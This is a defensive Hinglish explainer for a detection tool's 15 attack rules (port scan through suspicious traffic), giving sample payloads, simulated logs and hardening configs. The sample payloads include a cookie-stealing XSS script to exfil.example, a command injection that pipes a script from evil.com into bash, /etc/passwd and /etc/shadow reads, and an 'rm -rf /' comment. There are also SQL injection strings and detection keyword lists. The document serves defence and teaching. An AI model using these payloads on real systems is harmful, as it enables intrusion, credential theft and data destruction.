# 🛡️ CyberShield AI — 15 Attack Types Explained

> Yeh document tumhare CyberShield AI ke **15 attack detection rules** ko simple aur easy language me explain karta hai.
> Har attack ke saath **ek real example** diya gaya hai jo humaare codebase me use hota hai.

---

## Quick Overview Table

| #  | Attack Type              | Severity     | Ek Line Me                                              |
|----|--------------------------|--------------|----------------------------------------------------------|
| 1  | Port Scan                | 🟡 Medium   | Hacker dekh raha hai kaunse darwaze (ports) khule hain   |
| 2  | SQL Injection            | 🔴 Critical  | Database me chori karne ke liye fake query bhej raha hai  |
| 3  | XSS (Cross-Site Script)  | 🟠 High      | Dusre user ke browser me chhup ke script chala raha hai   |
| 4  | Brute Force Login        | 🟠 High      | Baar baar password try kar raha hai (web login)           |
| 5  | SSH Brute Force          | 🔴 Critical  | Server ke SSH door pe password tod raha hai                |
| 6  | FTP Brute Force          | 🟠 High      | FTP file server ka password tod raha hai                  |
| 7  | DDoS                     | 🔴 Critical  | Hazaaron requests bhej ke server crash kara raha hai       |
| 8  | Directory Traversal      | 🟠 High      | `../../etc/passwd` se secret files padh raha hai           |
| 9  | Command Injection        | 🔴 Critical  | Server pe seedha OS command chala raha hai                 |
| 10 | Suspicious File Upload   | 🟠 High      | `.php` / `.exe` jaise khatarnak file upload kar raha hai   |
| 11 | Malware Upload           | 🔴 Critical  | Known virus / malware file upload kar raha hai              |
| 12 | DNS Amplification        | 🟠 High      | Choti query bhej ke bada reply kisi aur pe maarta hai      |
| 13 | ARP Spoofing             | 🔴 Critical  | Network me beech me baith ke data chura raha hai           |
| 14 | ICMP Flood               | 🟡 Medium   | Ping requests ka flood bhej ke bandwidth kha raha hai      |
| 15 | Suspicious Traffic       | 🟢 Low       | Hacking tools ya shady ports ka use kar raha hai           |

---

## Detailed Explanation — Har Attack 1-2 Line + Example

---

### 1. 🔍 Port Scan

**Kya karta hai:** Hacker aapke server ke saare ports (darwaze) ek ek karke check karta hai — kaunsa khula hai, kaunsa band hai. Jaise chor pehle ghar ke saare windows aur doors check kare.

**Detection Rule:** Agar ek IP se **60 seconds me 15+ alag ports** pe request aaye → Port Scan detected.

**Real Example (from our simulator):**
```
Attacker IP 185.220.101.42 → Target 10.0.0.20
Ports scanned: 21, 22, 80, 443, 3306, 3389, 8080... (24-36 ports)
```

**Raw Log:**
```
fw01 kernel: [UFW BLOCK] IN=eth0 SRC=185.220.101.42 DST=10.0.0.20 PROTO=TCP DPT=3306 SYN
```

**MITRE:** T1046 — Network Service Discovery

**Kya karna chahiye:** Firewall pe source IP block karo, unnecessary ports band karo.

---

### 2. 💉 SQL Injection

**Kya karta hai:** Hacker website ke form ya URL me SQL code daal ke database se data chura leta hai. Jaise kisi se baat karte karte uski chabi chura lena.

**Detection Rule:** Request me SQL keywords milein jaise `UNION SELECT`, `' OR '1'='1'`, `DROP TABLE` → SQL Injection detected.

**Real Example:**
```
GET /api/v1/products?id=1' OR '1'='1' --
GET /api/v1/users?id=1 UNION ALL SELECT username,password,NULL FROM users --
```

**Raw Log:**
```
185.220.101.42 - - "GET /api/v1/products?id=1' OR '1'='1' -- HTTP/1.1" 500 2340
```

**MITRE:** T1190 — Exploit Public-Facing Application

**Kya karna chahiye:** Parameterized queries use karo, input sanitize karo, WAF enable karo.

---

### 3. 🎭 XSS (Cross-Site Scripting)

**Kya karta hai:** Hacker website me `<script>` tag ya JavaScript code inject karta hai. Jab koi aur user woh page kholta hai, uske browser me hacker ka code chal jaata hai — uski cookies chori ho jaati hain.

**Detection Rule:** Request me `<script>`, `javascript:`, `onerror=`, `document.cookie` jaise patterns milein → XSS detected.

**Real Example:**
```
GET /search?q=<script>fetch('//exfil.example/'+document.cookie)</script>
GET /search?q="><img src=x onerror=alert(document.domain)>
```

**MITRE:** T1059.007 — JavaScript Command Interpreter

**Kya karna chahiye:** Output encoding karo, Content-Security-Policy lagao, cookies pe HttpOnly flag lagao.

---

### 4. 🔑 Brute Force Login (Web)

**Kya karta hai:** Hacker baar baar alag alag passwords try karta hai jab tak sahi password na mil jaaye. Jaise taale pe 1000 chaabiyan try karna.

**Detection Rule:** Ek IP se **2 minute me 8+ failed logins** → Brute Force detected.

**Real Example:**
```
POST /api/v1/auth/login  user="admin"  pass="123456"    → 401
POST /api/v1/auth/login  user="admin"  pass="password"  → 401
POST /api/v1/auth/login  user="root"   pass="letmein"   → 401
... (12-28 attempts)
```

**MITRE:** T1110.001 — Password Guessing

**Kya karna chahiye:** MFA enable karo, 3 fail ke baad CAPTCHA lagao, account lock karo.

---

### 5. 🖥️ SSH Brute Force

**Kya karta hai:** Port 22 (SSH) pe baar baar password try karke server ka remote access lene ki koshish. Agar password mil gaya toh hacker ko pura server control mil jaata hai.

**Detection Rule:** Port 22 pe ek IP se **2 minute me 5+ failed SSH logins** → SSH Brute Force detected.

**Real Example:**
```
sshd[12345]: Failed password for invalid user admin from 185.220.101.42 port 54321 ssh2
sshd[12346]: Failed password for root from 185.220.101.42 port 54322 ssh2
... (8-22 attempts)
```

**MITRE:** T1110.001 — Password Guessing

**Kya karna chahiye:** SSH pe password band karo, sirf SSH keys use karo, fail2ban lagao.

---

### 6. 📂 FTP Brute Force

**Kya karta hai:** Port 21 (FTP) pe baar baar login try karke file server access karna. FTP passwords plain text me jaate hain, toh aur zyada khatarnak hai.

**Detection Rule:** Port 21 pe ek IP se **2 minute me 5+ failed FTP logins** → FTP Brute Force detected.

**Real Example:**
```
ftpd: Failed login for user "backup" from 185.220.101.42
ftpd: Failed login for user "ftpuser" from 185.220.101.42
... (5+ attempts)
```

**MITRE:** T1110.001 — Password Guessing

**Kya karna chahiye:** FTP band karo, SFTP use karo. Agar zaruri hai toh known IPs tak restrict karo.

---

### 7. 💥 DDoS (Distributed Denial of Service)

**Kya karta hai:** Bohot saare computers se ek saath hazaaron requests bhej ke server ko overload kar deta hai. Server itna busy ho jaata hai ke normal users ko reply nahi de paata.

**Detection Rule:** Ek target pe **10 seconds me 120+ requests** ya **5000+ packets** ek flow me → DDoS detected.

**Real Example:**
```
Source: 203.0.x.x (rotating botnet IPs from /16 range)
Target: 10.0.0.20:443
Requests: 160-320 burst, packets: 400-9000 per flow
Status: 503 Service Unavailable
```

**Raw Log:**
```
lb01 haproxy: 203.0.45.12:49221 frontend~ backend/web-prod-01 503 212 - SC--
```

**MITRE:** T1498 — Network Denial of Service

**Kya karna chahiye:** CDN/DDoS protection enable karo (Cloudflare), rate limiting lagao, SYN cookies on karo.

---

### 8. 📁 Directory Traversal

**Kya karta hai:** URL me `../../../etc/passwd` daal ke server ki secret files padh leta hai. Jaise ghar ke ek kamre se doosre locked kamre me ghusna.

**Detection Rule:** Request me `../`, `%2e%2e%2f`, `/etc/passwd`, `win.ini` jaise patterns → Directory Traversal detected.

**Real Example:**
```
GET /download?file=../../../../etc/passwd
GET /download?file=..%2f..%2f..%2fetc%2fshadow
GET /download?file=....//....//windows/win.ini
```

**MITRE:** T1083 — File and Directory Discovery

**Kya karna chahiye:** File paths validate karo, web root se bahar jaane do mat, server ko unprivileged user se chalao.

---

### 9. ⚡ Command Injection

**Kya karta hai:** Hacker input field me OS commands daal deta hai jaise `; whoami` ya `| cat /etc/passwd`. Server seedha system pe command chala deta hai — **sabse khatarnak attack.**

**Detection Rule:** Input me `;`, `|`, `&&` ke baad `whoami`, `cat`, `ls`, `curl`, `bash` jaise commands → Command Injection detected.

**Real Example:**
```
GET /uploads/shell.php?cmd=;whoami
GET /api/search?q=test;cat /etc/passwd
GET /ping?host=127.0.0.1 && curl http://evil.com/steal.sh | bash
```

**MITRE:** T1059 — Command and Scripting Interpreter

**Kya karna chahiye:** User input kabhi bhi shell ko mat do, argument arrays use karo, process ko restricted account me chalao.

---

### 10. 📤 Suspicious File Upload

**Kya karta hai:** Hacker `.php`, `.exe`, `.jsp` jaise executable files upload karta hai server pe. Agar server un files ko execute kar le, toh hacker ko **backdoor** (web shell) mil jaata hai.

**Detection Rule:** Uploaded file ka extension `.php`, `.exe`, `.aspx`, `.jsp` ho ya double extension ho (jaise `image.jpg.php`) → Suspicious Upload detected.

**Real Example:**
```
POST /api/v1/files/upload
Filename: upload.php           ← web shell
Filename: image.jpg.php        ← double extension trick
Filename: shell.phtml          ← PHP alternate extension
Filename: backup.aspx          ← ASP.NET shell
Content-Type: application/x-php
```

**Raw Log:**
```
auditd: type=PATH name="/var/www/html/uploads/upload.php" nametype=CREATE mode=0755
```

**MITRE:** T1505.003 — Web Shell

**Kya karna chahiye:** Files ko web root ke bahar store karo, extension ki jagah content-type check karo, execute permission mat do.

---

### 11. 🦠 Malware Upload

**Kya karta hai:** Hacker ek file upload karta hai jiska hash known malware signatures se match karta hai. Humaara system EICAR test file se match karta hai (industry standard safe test).

**Detection Rule:** File ka SHA-256 hash known malware list me ho, ya EICAR signature mile, ya antivirus verdict "malicious" ho → Malware Upload detected.

**Real Example:**
```
POST /api/v1/files/upload
Filename: invoice.pdf.exe
Hash: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f (EICAR)
AV Verdict: EICAR-Test-File
```

**Raw Log:**
```
clamd[884]: /var/uploads/invoice.pdf.exe: Eicar-Test-Signature FOUND
```

**MITRE:** T1204.002 — Malicious File Execution

**Kya karna chahiye:** File turant delete karo, host ki forensic image lo, credentials rotate karo, network me same hash dhundho.

---

### 12. 📡 DNS Amplification

**Kya karta hai:** Hacker chhoti si DNS query bhejta hai (40 bytes) spoofed source IP se — DNS server uska 20-70x bada reply kisi aur (victim) ko bhej deta hai. Jaise kisi ke naam se 100 pizzas order kar dena.

**Detection Rule:** DNS port 53 pe `ANY/TXT/DNSKEY` query + response/request ratio **10x+** + spoofed source → DNS Amplification detected.

**Real Example:**
```
Query: ANY isc.org (request: 60 bytes)
Reply: → victim IP (response: 60 × 40 = 2400 bytes)
Amplification: 40x
Source: Spoofed ✓
```

**Raw Log:**
```
dns01 named[612]: client 185.220.101.42#49123 query: isc.org IN ANY +E(0)K
```

**MITRE:** T1498.002 — Reflection Amplification

**Kya karna chahiye:** Open DNS recursion band karo, Response Rate Limiting (RRL) lagao, BCP38 ingress filtering karo.

---

### 13. 🕵️ ARP Spoofing / Man-in-the-Middle

**Kya karta hai:** Local network pe hacker **fake ARP reply** bhej ke gateway ka MAC address apna bata deta hai. Ab saara traffic hacker ke through jaata hai — woh sab kuch padh sakta hai (passwords, data).

**Detection Rule:** Agar ek IP ka MAC address **suddenly change** ho jaaye (pehle `aa:bb:cc` tha, ab `dd:ee:ff` hai) → ARP Spoofing detected.

**Real Example:**
```
Step 1: ARP reply → 10.0.0.1 is at aa:bb:cc:dd:ee:ff  (legit gateway)
Step 2: ARP reply → 10.0.0.1 is at 11:22:33:44:55:66  (attacker! MAC changed!)
Step 3: ARP reply → 10.0.0.1 is at 11:22:33:44:55:66  (attacker continues)
```

**Raw Log:**
```
sw-core arpwatch: changed station 10.0.0.1 11:22:33:44:55:66 (was aa:bb:cc:dd:ee:ff)
```

**MITRE:** T1557.002 — ARP Cache Poisoning

**Kya karna chahiye:** Switch pe Dynamic ARP Inspection (DAI) on karo, DHCP snooping lagao, gateway ke liye static ARP entry set karo.

---

### 14. 🏓 ICMP Flood (Ping Flood)

**Kya karta hai:** Hacker bohot zyada ping requests bhejta hai target server ko — itna zyada ke server ki bandwidth khatam ho jaaye aur slow ho jaaye.

**Detection Rule:** Ek source se **10 seconds me 200+ ICMP packets** → ICMP Flood detected.

**Real Example:**
```
Source: 185.220.101.42
Protocol: ICMP (ping)
Packets per burst: 80-400
Total bandwidth consumed: 64 KB - 900 KB per burst
```

**Raw Log:**
```
fw01 kernel: [ICMP FLOOD] IN=eth0 SRC=185.220.101.42 DST=10.0.0.20 PROTO=ICMP TYPE=8 CODE=0 LEN=1500
```

**MITRE:** T1498.001 — Direct Network Flood

**Kya karna chahiye:** Edge router pe ICMP rate-limit karo, untrusted networks se ping requests drop karo.

---

### 15. 🚨 Suspicious Network Traffic

**Kya karta hai:** Yeh koi ek specific attack nahi hai — yeh tab trigger hota hai jab traffic me **hacking tools ke signs** milte hain, jaise Nmap, SQLMap, Hydra ke User-Agent, ya ports jaise 4444 (Metasploit), 31337, ya Tor exit nodes.

**Detection Rule:** User-Agent me `sqlmap`, `nikto`, `nmap`, `hydra` milein, ya traffic port 4444/31337/1337 pe ho, ya Tor exit node se aaye, ya 50MB+ data bahar ja raha ho → Suspicious Traffic detected.

**Real Example:**
```
User-Agent: sqlmap/1.8.2#stable (https://sqlmap.org)
User-Agent: Nikto/2.5.0
User-Agent: Hydra v9.5
Port: 4444 (Metasploit default)
Port: 31337 (classic backdoor port)
```

**MITRE:** T1071 — Application Layer Protocol

**Kya karna chahiye:** Full packet capture lo, endpoint telemetry se correlate karo, suspicious destination block karo.

---

## 🛡️ Har Attack Se Kaise Bachein — Protection Guide

> Neeche har attack ke liye **easy protection tips** diye hain — simple language me, koi bhi samajh sakta hai.

---

### 1. Port Scan se kaise bachein

**Problem:** Hacker aapke server ke saare doors (ports) check kar raha hai.

**Protection:**
- ✅ **Sirf zaroori ports khule rakho** — jaise 80 (HTTP), 443 (HTTPS). Baaki sab band.
- ✅ **Firewall lagao** — UFW (Linux) ya Windows Firewall on karo.
- ✅ **Rate limiting** — agar ek IP se bahut zyada connections aa rahe hain, toh auto-block karo.
- ✅ **Port knocking** — pehle secret ports pe knock karo, tabhi asli port khule.

**Real life analogy:** Ghar ke saare darwaze lock karo, sirf main door khula rakho, aur CCTV lagao.

```bash
# Example: UFW firewall — sirf 80 aur 443 allow karo
sudo ufw default deny incoming
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

---

### 2. SQL Injection se kaise bachein

**Problem:** Hacker URL ya form me SQL code daal ke database chura raha hai.

**Protection:**
- ✅ **Parameterized queries use karo** — KABHI bhi user input ko seedha SQL me mat daalo.
- ✅ **ORM use karo** — SQLAlchemy, Prisma, Sequelize — yeh automatically safe queries banate hain.
- ✅ **Input validation** — special characters jaise `'`, `"`, `;`, `--` filter karo.
- ✅ **WAF (Web Application Firewall)** — Cloudflare WAF, ModSecurity lagao.
- ✅ **Least privilege** — database user ko sirf zaruri permissions do, DROP/ALTER mat do.

**Real life analogy:** Ghar ka lock aisa hona chahiye ke naqli chaabi chalti hi na ho.

```python
# ❌ GALAT — SQL Injection possible
cursor.execute(f"SELECT * FROM users WHERE id = '{user_input}'")

# ✅ SAHI — Parameterized query, safe
cursor.execute("SELECT * FROM users WHERE id = ?", (user_input,))
```

---

### 3. XSS (Cross-Site Scripting) se kaise bachein

**Problem:** Hacker website me script inject kar raha hai jo dusre users ke browser me chalti hai.

**Protection:**
- ✅ **Output encoding** — user ka data dikhate waqt HTML entities me convert karo (`<` → `&lt;`).
- ✅ **Content-Security-Policy (CSP)** — browser ko batao kaunsi scripts allowed hain.
- ✅ **HttpOnly cookies** — JavaScript se cookies access na ho sakein.
- ✅ **Input sanitization** — `<script>`, `onerror=`, `javascript:` wale input reject karo.
- ✅ **React/Vue use karo** — yeh frameworks by default XSS se protect karte hain.

**Real life analogy:** Parcel aane pe pehle scan karo, fir andar le jaao — seedha mat kholo.

```html
<!-- ❌ GALAT — XSS possible -->
<div>${userComment}</div>

<!-- ✅ SAHI — Escaped output -->
<div>${escapeHtml(userComment)}</div>
```

```
# CSP header lagao
Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

### 4. Brute Force Login se kaise bachein

**Problem:** Hacker baar baar passwords try kar raha hai web login pe.

**Protection:**
- ✅ **Account lockout** — 5 galat attempts ke baad account 15 minute lock karo.
- ✅ **CAPTCHA lagao** — 3 fail ke baad Google reCAPTCHA dikha do.
- ✅ **MFA / 2FA enable karo** — password sahi bhi ho toh OTP maango.
- ✅ **Strong passwords enforce karo** — minimum 12 characters, special characters.
- ✅ **Rate limiting** — ek IP se per minute limited login attempts allow karo.
- ✅ **Login attempts log karo** — dashbaord pe dikhao (CyberShield yeh karta hai!).

**Real life analogy:** ATM pe 3 baar galat PIN dalo toh card block — same concept.

```python
# Example: Rate limiting with progressive delay
if failed_attempts >= 3:
    show_captcha()
if failed_attempts >= 5:
    lock_account(minutes=15)
    notify_admin()
```

---

### 5. SSH Brute Force se kaise bachein

**Problem:** Port 22 pe baar baar password try karke server hack kar raha hai.

**Protection:**
- ✅ **Password authentication band karo** — sirf SSH keys use karo.
- ✅ **Port change karo** — SSH ko 22 se hatake 2222 ya kisi aur port pe daalo.
- ✅ **fail2ban lagao** — 3 galat attempts pe IP auto-ban (30 min).
- ✅ **VPN ke through hi SSH allow karo** — direct internet se SSH band.
- ✅ **Root login disable karo** — `PermitRootLogin no` set karo.

**Real life analogy:** Ghar ki chaabi sirf fingerprint se khule, password se nahi.

```bash
# /etc/ssh/sshd_config — security settings
PasswordAuthentication no        # Password band
PubkeyAuthentication yes         # Sirf key-based login
PermitRootLogin no               # Root direct login band
Port 2222                        # Default port change
MaxAuthTries 3                   # Max 3 attempts

# fail2ban install karo
sudo apt install fail2ban
```

---

### 6. FTP Brute Force se kaise bachein

**Problem:** FTP server pe baar baar login try kar raha hai. FTP passwords plain text me jaate hain!

**Protection:**
- ✅ **FTP band karo, SFTP use karo** — encrypted file transfer.
- ✅ **Agar FTP zaroori hai toh FTPS (FTP over TLS)** use karo.
- ✅ **IP whitelist** — sirf known IPs se FTP allow karo.
- ✅ **Anonymous FTP band karo** — default anonymous access hata do.
- ✅ **fail2ban FTP ke liye bhi lagao**.

**Real life analogy:** Postcard ki jagah sealed envelope use karo — koi beech me na padh sake.

```bash
# vsftpd config — FTP secure karo
anonymous_enable=NO
ssl_enable=YES
# Better: Just use SFTP (comes built-in with SSH)
```

---

### 7. DDoS se kaise bachein

**Problem:** Hazaaron computers se ek saath requests aake server down kar rahe hain.

**Protection:**
- ✅ **CDN + DDoS protection** — Cloudflare, AWS Shield, Akamai use karo.
- ✅ **Rate limiting** — per IP requests limit karo (jaise 100 req/min).
- ✅ **Load balancer** — traffic ko multiple servers me distribute karo.
- ✅ **SYN cookies** — TCP SYN flood se bachne ke liye kernel me enable karo.
- ✅ **Geo-blocking** — agar kisi specific country se attack aa raha hai toh block karo.
- ✅ **Auto-scaling** — AWS/GCP pe auto-scale on karo taaki load handle ho.

**Real life analogy:** Dukaan me ek saath 10,000 log aa jaayein — security guard aur barriers lagao.

```bash
# Nginx rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
location /api/ {
    limit_req zone=api burst=20 nodelay;
}
```

---

### 8. Directory Traversal se kaise bachein

**Problem:** `../../etc/passwd` se server ki private files padh raha hai.

**Protection:**
- ✅ **Path validation** — `../` wale paths reject karo.
- ✅ **Canonicalize paths** — `realpath()` use karke resolved path check karo.
- ✅ **Chroot/jail** — web server ko ek directory me band kar do, bahar ja hi na sake.
- ✅ **Whitelist approach** — sirf allowed files serve karo, baaki sab deny.
- ✅ **Web server unprivileged user** — root se mat chalao, toh sensitive files padh bhi na sake.

**Real life analogy:** Hotel me apne kamre ki chaabi se sirf apna kamra khule, doosro ka nahi.

```python
# ❌ GALAT — Traversal possible
file_path = "/uploads/" + user_input

# ✅ SAHI — Path validate karo
import os
base_dir = "/var/www/uploads"
requested = os.path.realpath(os.path.join(base_dir, user_input))
if not requested.startswith(base_dir):
    return "Access Denied", 403
```

---

### 9. Command Injection se kaise bachein

**Problem:** Hacker input me `; whoami` ya `| cat /etc/passwd` daal ke server pe command chala raha hai.

**Protection:**
- ✅ **KABHI user input ko shell me mat daalo** — `os.system()`, `subprocess.shell=True` use mat karo.
- ✅ **Argument arrays use karo** — `subprocess.run(["ping", ip])` safe hai.
- ✅ **Input validation** — sirf allowed characters (alphanumeric) accept karo.
- ✅ **Sandboxing** — process ko container ya restricted account me chalao.
- ✅ **WAF** — command injection patterns detect karta hai.

**Real life analogy:** Kisi ko bolo "yeh letter post karo" — woh letter ke andar likh de "bank se paise nikalo" — toh problem. Letter pehle padho, fir post karo.

```python
# ❌ GALAT — Command Injection possible
os.system(f"ping {user_input}")
# Input: "127.0.0.1; rm -rf /" → Server GONE! 💀

# ✅ SAHI — Argument array, no shell
import subprocess
subprocess.run(["ping", "-c", "4", user_input], shell=False)
```

---

### 10. Suspicious File Upload se kaise bachein

**Problem:** `.php`, `.exe` jaise executable files upload karke server pe backdoor bana raha hai.

**Protection:**
- ✅ **Extension whitelist** — sirf `.jpg`, `.png`, `.pdf` jaise safe files allow karo.
- ✅ **Content-type verify karo** — file ka actual content check karo, sirf extension nahi.
- ✅ **Files ko web root ke BAHAR store karo** — toh browser se directly access na ho.
- ✅ **Random filename** — original naam se rename karo (UUID use karo).
- ✅ **Execute permission mat do** — upload folder me `chmod -x` karo.
- ✅ **File size limit** — unreasonably large files reject karo.

**Real life analogy:** Airport pe bag scan hota hai — seedha andar nahi jaane dete, pehle check hota hai.

```python
# ✅ Safe file upload handling
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}
filename = secure_filename(uploaded_file.filename)
ext = os.path.splitext(filename)[1].lower()

if ext not in ALLOWED_EXTENSIONS:
    return "File type not allowed", 400

# Random naam se save karo, web root ke bahar
safe_name = f"{uuid.uuid4()}{ext}"
save_path = os.path.join("/var/uploads/private/", safe_name)
```

---

### 11. Malware Upload se kaise bachein

**Problem:** Known virus ya malware file upload ho rahi hai.

**Protection:**
- ✅ **Antivirus scanning** — har upload pe ClamAV ya similar scanner chalao.
- ✅ **Hash checking** — file ka hash known malware databases (VirusTotal) se compare karo.
- ✅ **Sandboxed execution** — suspicious files ko sandbox me run karo pehle.
- ✅ **Quarantine** — suspicious files ko alag folder me rakho, serve mat karo.
- ✅ **Endpoint protection** — server pe EDR (Endpoint Detection & Response) lagao.

**Real life analogy:** Hospital me patient aaye toh pehle temperature check — infection ho toh alag ward me rakho.

```bash
# ClamAV se file scan karo upload ke baad
clamscan --no-summary /var/uploads/new_file.exe
# Result: /var/uploads/new_file.exe: Eicar-Test-Signature FOUND
```

---

### 12. DNS Amplification se kaise bachein

**Problem:** Chhoti DNS query se bada response generate karke kisi aur pe attack kar raha hai.

**Protection:**
- ✅ **Open resolver band karo** — DNS server ko sirf apne network ke liye configure karo.
- ✅ **Response Rate Limiting (RRL)** — zyada responses per second limit karo.
- ✅ **BCP38 filtering** — spoofed source IPs network edge pe block karo.
- ✅ **ANY query disable karo** — amplification-friendly query types block karo.
- ✅ **DNS firewall** — RPZ (Response Policy Zones) use karo.

**Real life analogy:** Kisi ne aapke naam se 100 pizza order kiye — pizza wale ko verify karna chahiye ki order asli hai ya nahi.

```bash
# BIND config — open recursion band karo
options {
    recursion no;           # External recursion band
    allow-query { trusted; };  # Sirf trusted networks
    rate-limit {
        responses-per-second 5;  # Response rate limit
    };
};
```

---

### 13. ARP Spoofing se kaise bachein

**Problem:** Local network pe hacker gateway ka MAC change karke saara traffic apne through le ja raha hai.

**Protection:**
- ✅ **Dynamic ARP Inspection (DAI)** — managed switch pe enable karo.
- ✅ **DHCP snooping** — switch ko pata ho kaunsa IP kaunse port pe hai.
- ✅ **Static ARP entries** — gateway ke liye permanent ARP entry set karo.
- ✅ **802.1X authentication** — network pe sirf verified devices allowed.
- ✅ **VLAN segmentation** — sensitive systems alag VLAN me rakho.
- ✅ **VPN / encrypted traffic** — agar koi sniff bhi kare toh data padh na sake.

**Real life analogy:** Koi aapki jagah ID card dikhake office me ghus jaaye — biometric verification lagao.

```bash
# Linux — static ARP entry set karo for gateway
sudo arp -s 10.0.0.1 aa:bb:cc:dd:ee:ff

# Cisco switch — DAI enable karo
ip arp inspection vlan 10
```

---

### 14. ICMP Flood se kaise bachein

**Problem:** Bohot zyada ping requests se bandwidth khatam ho rahi hai.

**Protection:**
- ✅ **ICMP rate limit** — router/firewall pe ICMP packets limit karo.
- ✅ **Ping disable karo** — agar zaroori nahi hai toh ICMP echo reply band karo.
- ✅ **Firewall rules** — untrusted networks se ICMP drop karo.
- ✅ **ISP se baat karo** — upstream pe hi ICMP flood filter karwa lo.

**Real life analogy:** Koi aapke doorbell pe continuously press kare — doorbell off kar do ya timer lagao.

```bash
# Linux — ICMP rate limit karo
sudo iptables -A INPUT -p icmp --icmp-type echo-request \
    -m limit --limit 1/s --limit-burst 4 -j ACCEPT
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```

---

### 15. Suspicious Network Traffic se kaise bachein

**Problem:** Hacking tools (Nmap, SQLMap, Hydra) ya known bad ports (4444, 31337) ka traffic aa raha hai.

**Protection:**
- ✅ **IDS/IPS lagao** — Snort, Suricata jaise tools suspicious traffic detect karte hain.
- ✅ **User-Agent filtering** — known hacking tools ke User-Agents block karo.
- ✅ **Port blocking** — 4444, 31337, 1337 jaise known bad ports block karo.
- ✅ **Network monitoring** — traffic patterns monitor karo (CyberShield yeh karta hai!).
- ✅ **Tor exit node blocking** — agar zaruri nahi hai toh Tor traffic block karo.
- ✅ **Egress filtering** — outgoing traffic bhi monitor karo — data leak na ho.

**Real life analogy:** CCTV pe koi mask pehen ke aaye ya hacking tools leke aaye — alert bajao.

```bash
# iptables — suspicious ports block karo
sudo iptables -A INPUT -p tcp --dport 4444 -j DROP   # Metasploit
sudo iptables -A INPUT -p tcp --dport 31337 -j DROP   # Back Orifice
sudo iptables -A INPUT -p tcp --dport 1337 -j DROP    # Common backdoor
```

---

## 📋 Quick Protection Checklist — Sab Ke Liye

Yeh cheezein karo toh **80% attacks se bach jaoge:**

| #  | Kya Karna Hai                                  | Kaunse Attacks Se Bachata Hai              |
|----|------------------------------------------------|---------------------------------------------|
| 1  | 🔥 **Firewall ON karo, extra ports band karo** | Port Scan, ICMP Flood, Suspicious Traffic   |
| 2  | 🔒 **Parameterized queries use karo**           | SQL Injection                               |
| 3  | 🛡️ **CSP header + output encoding lagao**      | XSS                                         |
| 4  | 🔐 **MFA/2FA enable karo har jagah**           | Brute Force, SSH Brute Force, FTP Brute Force |
| 5  | 🚫 **SSH keys use karo, password band karo**   | SSH Brute Force                             |
| 6  | ☁️ **Cloudflare/CDN + rate limiting lagao**     | DDoS, DNS Amplification, ICMP Flood        |
| 7  | 📁 **File paths validate karo**                | Directory Traversal                         |
| 8  | 💻 **User input shell me KABHI mat daalo**     | Command Injection                           |
| 9  | 📤 **Upload pe extension + content check karo** | Suspicious File Upload, Malware Upload      |
| 10 | 🦠 **Antivirus scan har upload pe chalao**     | Malware Upload                              |
| 11 | 🔄 **Switch pe DAI + DHCP snooping ON karo**   | ARP Spoofing                                |
| 12 | 📊 **CyberShield AI jaisa SIEM use karo!**     | SAB attacks monitor hote hain ✅             |

---

## Code References

| Component | File | What it does |
|---|---|---|
| Detection Rules | [`rules.py`](../backend/app/detection/rules.py) | All 15 rules with regex patterns + match functions |
| Detection Engine | [`engine.py`](../backend/app/detection/engine.py) | Runs observations through rules, picks highest score |
| Sliding Window | [`state.py`](../backend/app/detection/state.py) | Tracks counts/rates for Port Scan, Brute Force, DDoS, ICMP |
| Attack Simulator | [`scenarios.py`](../backend/app/simulator/scenarios.py) | 12 scenario builders that generate fake observations |
| Simulator Runner | [`runner.py`](../backend/app/simulator/runner.py) | Async runner — start/stop/pause/repeat |
| Pipeline | [`pipeline.py`](../backend/app/pipeline.py) | Observation → Detection → Event → Notification → WebSocket |

---

## Severity Levels

| Level    | Color  | Meaning                                    |
|----------|--------|--------------------------------------------|
| Critical | 🔴 Red | Server compromise, data breach possible     |
| High     | 🟠 Orange | Serious attack, needs immediate attention |
| Medium   | 🟡 Yellow | Reconnaissance or moderate threat          |
| Low      | 🟢 Green  | Suspicious but not confirmed attack         |

---

## MITRE ATT&CK Tactics Used

| Tactic              | Attacks                                           |
|---------------------|---------------------------------------------------|
| **Discovery**       | Port Scan, Directory Traversal                    |
| **Initial Access**  | SQL Injection, XSS                                |
| **Credential Access** | Brute Force Login, SSH Brute Force, FTP Brute Force, ARP Spoofing |
| **Execution**       | Command Injection, Malware Upload                 |
| **Persistence**     | Suspicious File Upload                            |
| **Impact**          | DDoS, DNS Amplification, ICMP Flood               |
| **Command & Control** | Suspicious Network Traffic                      |

---

> 📌 **Note:** CyberShield AI ka simulator sirf **synthetic log records** banata hai — koi real network traffic nahi bhejta, koi socket nahi kholta. Yeh fully safe educational tool hai.
